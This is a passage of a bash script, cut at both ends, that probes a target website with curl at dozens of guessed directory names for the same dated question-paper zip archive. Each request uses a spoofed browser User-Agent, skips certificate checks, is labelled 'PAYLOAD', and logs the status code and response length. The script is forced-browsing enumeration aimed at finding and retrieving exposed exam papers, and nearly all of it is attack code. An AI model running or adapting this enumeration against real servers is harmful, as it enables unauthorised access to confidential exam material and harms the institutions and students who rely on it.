" "${target}QPService-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
